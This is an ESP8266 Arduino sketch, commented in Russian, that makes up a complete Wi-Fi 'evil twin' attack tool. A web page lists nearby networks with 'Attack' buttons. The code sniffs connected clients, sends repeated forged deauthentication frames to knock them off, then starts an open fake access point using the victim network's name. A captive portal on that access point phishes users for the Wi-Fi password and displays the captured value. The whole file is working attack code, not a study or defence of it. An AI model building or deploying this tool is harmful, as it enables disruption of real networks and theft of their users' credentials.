#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <vector>


// =====================================================================
// 1. Структуры для промискуитетного режима
// =====================================================================

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration_id;
  uint8_t addr1[6];
  uint8_t addr2[6]; // MAC отправителя
  uint8_t addr3[6]; // BSSID
  uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;


// =====================================================================
// 2. Глобальные переменные
// =====================================================================

String capturedPassword = ""; // Для сохранения пароля

// DNS сервер для Captive Portal
DNSServer dnsServer;
const byte DNS_PORT = 53;

// Управляющая точка доступа (AP)
const char* ap_ssid     = "ESP8266_AccessPoint";  
const char* ap_password = "123456789";

// Веб-сервер
ESP8266WebServer server(80);

// HTML-таблица результатов сканирования
String wifiTable;
float scanDuration = 0.0f; // время сканирования (сек) - можно вырезать

// Флаги и переменные для атаки
bool  isScanningClients  = false;  // проверка сканирования 
bool  hasDeauthed        = false;  // проверка Deauth 
bool  hasPrintedClients  = false;  
bool  fakeApStarted      = false;  // проверка AP

static const uint32_t CLIENT_SCAN_TIME = 10000; // (мс) время скана клиентов
unsigned long clientScanStart = 0;

// Список клиентов
static std::vector<String> knownClients;

// BSSID, канал, **SSID** атакуемой сети
uint8_t target_bssid[6] = {0};
uint8_t target_channel  = 0;
// Сохраняем имя атакуемой сети -> фейк AP
String target_ssid = "";

// Параметры деаутентификации (кол-во, тайминги)
static const uint8_t  NUM_ROUNDS      = 10;      
static const uint16_t DEAUTH_DELAY_MS = 1000; 
static const uint16_t ROUND_DELAY_MS  = 1000;  


// =====================================================================
// 3. Сканирование Wi-Fi
// =====================================================================

void scanAnimation() {
  Serial.print("Scanning networks");
  for (int i = 0; i < 10; i++) {
    delay(100);
    Serial.print(".");
  }
  Serial.println(" done.");
}

void scanWiFiNetworks() {
  Serial.println("\n--- Starting Wi-Fi network scan ---");
  unsigned long t0 = millis();
  scanAnimation();

  int networkCount = WiFi.scanNetworks();
  unsigned long t1 = millis();
  scanDuration = (t1 - t0) / 1000.0;

  int* indices = new int[networkCount];
  for (int i = 0; i < networkCount; i++) indices[i] = i;

  // Сортируем по убыванию RSSI
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (WiFi.RSSI(indices[j]) < WiFi.RSSI(indices[j + 1])) {
        int temp = indices[j];
        indices[j] = indices[j + 1];
        indices[j + 1] = temp;
      }
    }
  }

  // Формируем HTML-таблицу
  wifiTable = "<table border='1' style='border-collapse:collapse;'>";
  wifiTable += "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Action</th></tr>";

  Serial.println("--- Found networks ---");
  for (int i = 0; i < networkCount; i++) {
    int idx = indices[i];
    String ssid = WiFi.SSID(idx);
    String bss  = WiFi.BSSIDstr(idx);
    int rssi    = WiFi.RSSI(idx);
    int ch      = WiFi.channel(idx);

    Serial.printf("Network: %s, BSSID: %s, Ch:%d, RSSI:%d dBm\n",
                  ssid.c_str(), bss.c_str(), ch, rssi);

    // Добавим и параметр ssid=..., чтобы подделать его потом
    String attackLink = "/attack?bssid=" + bss + "&ch=" + String(ch) + "&ssid=" + ssid;

    wifiTable += "<tr>";
    wifiTable += "<td>" + ssid + "</td>";
    wifiTable += "<td>" + bss  + "</td>";
    wifiTable += "<td>" + String(ch) + "</td>";
    wifiTable += "<td>" + String(rssi) + " dBm</td>";
    wifiTable += "<td><button onclick=\"location.href='" + attackLink + "'\">Attack</button></td>";
    wifiTable += "</tr>";
  }
  wifiTable += "</table>";

  delete[] indices;
}


// =====================================================================
// 4. Веб-обработчики: handleRoot, handleAttack
// =====================================================================

bool stringToBssid(const String &bssidStr, uint8_t *bssidArr) {
  if (bssidStr.length() != 17) return false;
  for (uint8_t i = 0; i < 6; i++) {
    char c1 = bssidStr[3*i + 0];
    char c2 = bssidStr[3*i + 1];
    auto hexVal = [](char c) -> uint8_t {
      if (c >= '0' && c <= '9') return c - '0';
      if (c >= 'A' && c <= 'F') return c - 'A' + 10;
      if (c >= 'a' && c <= 'f') return c - 'a' + 10;
      return 0;
    };
    bssidArr[i] = (hexVal(c1) << 4) | hexVal(c2);
  }
  return true;
}

// Главная страница
void handleRoot() {
  String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>ESP8266 Wi-Fi Scanner</title>
    </head>
    <body>
      <h1>Available Wi-Fi Networks</h1>
  )rawliteral";

  html += wifiTable;
  html += "<p>Scan took " + String(scanDuration, 2) + " seconds.</p>";

  html += R"rawliteral(
    </body>
    </html>
  )rawliteral";

  server.send(200, "text/html", html);
}

// Когда пользователь нажимает "Attack"
void handleAttack() {
  String bssidStr = server.arg("bssid");
  String chStr    = server.arg("ch");
  target_ssid     = server.arg("ssid"); // сохраняем имя сети

  Serial.println("=== handleAttack ===");
  Serial.print("bssidStr = "); Serial.println(bssidStr);
  Serial.print("chStr    = "); Serial.println(chStr);
  Serial.print("target_ssid = "); Serial.println(target_ssid);

  if (bssidStr.length() == 17 && chStr.length() > 0) {
    uint8_t tmpBssid[6];
    if (!stringToBssid(bssidStr, tmpBssid)) {
      server.send(400, "text/plain", "Invalid BSSID format");
      return;
    }
    int ch = chStr.toInt();
    if (ch < 1 || ch > 14) {
      server.send(400, "text/plain", "Invalid channel");
      return;
    }

    memcpy(target_bssid, tmpBssid, 6);
    target_channel = (uint8_t)ch;

    knownClients.clear();
    isScanningClients = true;
    hasDeauthed       = false;
    hasPrintedClients = false;
    clientScanStart   = millis();

    // Выключаем AP, включаем STA + промискуитет
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    wifi_set_channel(target_channel);

    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(false);

    // Промискуитетный коллбэк
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
      if (!isScanningClients) return;
      if (len < 12 + sizeof(wifi_ieee80211_mac_hdr_t)) return;

      auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
      auto *hdr    = &packet->hdr;
      // Если BSSID == target_bssid и отправитель != bssid => клиент
      if (memcmp(hdr->addr3, target_bssid, 6) == 0) {
        if (memcmp(hdr->addr2, target_bssid, 6) != 0) {
          char c[18];
          snprintf(c, sizeof(c), "%02X:%02X:%02X:%02X:%02X:%02X",
                   hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                   hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
          String clientMac = String(c);

          bool found = false;
          for (auto &mc : knownClients) {
            if (mc.equalsIgnoreCase(clientMac)) {
              found = true;
              break;
            }
          }
          if (!found) {
            knownClients.push_back(clientMac);
            Serial.print("Обнаружен клиент: ");
            Serial.println(clientMac);
          }
        }
      }
    });
    wifi_promiscuous_enable(true);

    // Ответ пользователю
    String msg = "OK! Attacking BSSID=" + bssidStr + ", channel=" + String(ch);
    msg += ". Scanning clients for 10s...";
    server.send(200, "text/plain", msg);

  } else {
    server.send(400, "text/plain", "Missing or invalid parameters");
  }
}


// =====================================================================
// 5. DEAUTH logic
// =====================================================================

bool sendDeauthPacket(const uint8_t *clientMAC) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Deauth
    0x00, 0x00, // Duration
    0,0,0,0,0,0, // Dest
    0,0,0,0,0,0, // Source
    0,0,0,0,0,0, // BSSID
    0x00, 0x00, // Seq
    0x07, 0x00  // Reason code 7
  };

  // Заполняем поля
  memcpy(&deauthPacket[4],  clientMAC,     6); 
  memcpy(&deauthPacket[10], target_bssid,  6);
  memcpy(&deauthPacket[16], target_bssid,  6);

  int res = wifi_send_pkt_freedom(deauthPacket, 26, 0);
  return (res == 0);
}

void deauthClientsRoundRobin() {
  Serial.println("\n=== Отправка Deauth (раунд-робин) ===");
  if (knownClients.empty()) {
    Serial.println("Нет клиентов для деаутентификации.");
    return;
  }

  for (uint8_t round = 1; round <= NUM_ROUNDS; round++) {
    Serial.printf("\n--- Раунд %d из %d ---\n", round, NUM_ROUNDS);
    for (auto &c : knownClients) {
      if (c.length() == 17) {
        // Быстрый parse
        uint8_t cm[6];
        for (int i = 0; i < 6; i++) {
          auto hexVal = [](char x) -> uint8_t {
            if (x >= '0' && x <= '9') return x - '0';
            if (x >= 'A' && x <= 'F') return x - 'A' + 10;
            if (x >= 'a' && x <= 'f') return x - 'a' + 10;
            return 0;
          };
          uint8_t b1 = hexVal(c[3*i + 0]);
          uint8_t b2 = hexVal(c[3*i + 1]);
          cm[i] = (b1 << 4) | b2;
        }
        Serial.printf("Deauth -> %s (round %d)\n", c.c_str(), round);
        bool ok = sendDeauthPacket(cm);
        if (!ok) Serial.println("  Ошибка отправки!");

        delay(DEAUTH_DELAY_MS);
      }
    }
    delay(ROUND_DELAY_MS);
  }
  Serial.println("\n=== Завершили отправку Deauth ===");
}


// =====================================================================
// 6. "Fake AP" + Captive Portal
// =====================================================================

void handleCaptivePortal() {
  String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Captive Portal</title>
    </head>
    <body>
      <h2>Enter Wi-Fi Password</h2>
      <form action="/submit" method="POST">
        <input type="password" name="wifi_pass" placeholder="WiFi Password" required>
        <input type="submit" value="Submit">
      </form>
    </body>
    </html>
  )rawliteral";
  server.send(200, "text/html", html);
}

void handleViewPassword() {
  String html = "<!DOCTYPE html><html><head><title>Captured Password</title></head><body>";
  html += "<h2>Captured Password:</h2>";
  html += "<p>" + capturedPassword + "</p>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleHotspotDetect() {
  // Страница Captive Portal с формой для ввода пароля
  String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Captive Portal</title>
    </head>
    <body>
      <h1>Welcome to the Captive Portal</h1>
      <h2>Please enter your Wi-Fi password:</h2>
      <form action="/submit" method="POST">
        <label for="wifi_pass">Wi-Fi Password:</label>
        <input type="password" id="wifi_pass" name="wifi_pass" required>
        <br><br>
        <input type="submit" value="Submit">
      </form>
    </body>
    </html>
  )rawliteral";

  server.send(200, "text/html", html);
}


void handleSubmit() {
  capturedPassword = server.arg("wifi_pass");
  Serial.print("[CaptivePortal] Password captured: ");
  Serial.println(capturedPassword);

  // Подтверждение для пользователя (можно вырезать , надо протестировать (правила http))
  String response = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Success</title>
    </head>
    <body>
      <h2>Password captured successfully!</h2>
      <a href="/view-password">View Captured Password</a>
    </body>
    </html>
  )rawliteral";

  server.send(200, "text/html", response);
}

void startFakeAP() {
  wifi_promiscuous_enable(false);
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
  delay(200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(target_ssid.c_str(), NULL); // Точка доступа без пароля
  IPAddress ip = WiFi.softAPIP();
  Serial.println("\n=== Fake AP started ===");
  Serial.printf("SSID: %s\n", target_ssid.c_str());
  Serial.print("IP: ");
  Serial.println(ip);

  dnsServer.start(DNS_PORT, "*", ip);

  server.on("/hotspot-detect.html", handleHotspotDetect);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.on("/view-password", handleViewPassword); // Новый маршрут для просмотра пароля
  server.begin();
  Serial.println("Fake Captive Portal server started.");
}


// =====================================================================
// 7. setup() & loop()
// =====================================================================

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("=== ESP8266 Wi-Fi Scanner + Deauth + Fake AP ===");

  // (1) Поднимаем управляющую AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  IPAddress ip = WiFi.softAPIP();
  Serial.print("AP IP: ");
  Serial.println(ip);

  // (2) Сканируем сети
  scanWiFiNetworks();

  // (3) Настраиваем сервер
  server.on("/", handleRoot);
  server.on("/attack", handleAttack);

  // Каптив-портал будет активен позже, после startFakeAP()

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest(); // Обработка DNS-запросов
  // Обслуживаем запросы
  server.handleClient();

  // Если идёт промискуитетное сканирование клиентов
  if (isScanningClients) {
    // Когда прошли 10s
    if (millis() - clientScanStart >= CLIENT_SCAN_TIME) {
      isScanningClients = false;
      wifi_promiscuous_enable(false);

      Serial.println("\n=== Сканирование клиентов завершено ===");
      Serial.printf("Найдено %d клиентов\n", knownClients.size());

      if (!hasPrintedClients) {
        if (knownClients.empty()) {
          Serial.println("Нет клиентов - нечего деаутентифицировать.");
        } else {
          Serial.println("Список клиентов:");
          for (auto &mc : knownClients) {
            Serial.println("  " + mc);
          }
        }
        hasPrintedClients = true;
      }

      // Если что-то нашли -> деаут
      if (!knownClients.empty()) {
        hasDeauthed = true;
        wifi_promiscuous_enable(true);
        deauthClientsRoundRobin();
        wifi_promiscuous_enable(false);
      }
    }
  }

  // Если уже провели деаут (hasDeauthed == true) и еще не подняли фейк-AP
  if (hasDeauthed && !fakeApStarted) {
    fakeApStarted = true;
    Serial.println("\n=== Переходим к поднятию фейковой AP ===");
    // Запускаем AP с тем же SSID, что была атакуемая
    startFakeAP();
  }
}
